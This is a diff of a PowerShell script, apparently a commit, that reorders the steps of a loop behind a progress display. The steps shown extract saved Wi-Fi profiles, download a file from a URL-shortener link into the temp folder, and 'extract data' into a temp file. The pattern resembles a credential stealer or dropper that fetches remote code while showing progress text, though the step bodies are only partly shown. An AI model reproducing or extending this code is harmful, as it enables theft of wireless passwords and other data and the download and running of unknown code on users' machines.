@@ -121,7 +121,7 @@ $totalSteps = 5  # Adjust this to the number of main operations you want to trac
 for ($step = 1; $step -le $totalSteps; $step++) {
     # Perform your operation here
     switch ($step) {
-        1 {
+        3 {
             # Operation 1 - Extract Wi-Fi profiles
             $textBlock.Text = "Starting Operation " + $step + "/" + $totalSteps 
             try {
@@ -175,7 +175,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
             $textBlock.Text = "Starting operation 2..."
             # Write-Output "Completed Operation 1 - NETSH"
         }
-        2 {
+        1 {
             # Operation 2
             $url = "https://lnkfwd.com/u/Kpj_Yric"  # Define the URL of the file to be downloaded
             $tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")  # Define the path to save the file in the %temp% folder
@@ -205,7 +205,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
 
             # Write-Output "Completed Operation 2"
         }
-        3 {
+        2 {
             # Operation 3 - EXTRACT DATA 
 
             $outputFilePath = "$env:TEMP\data.txt"
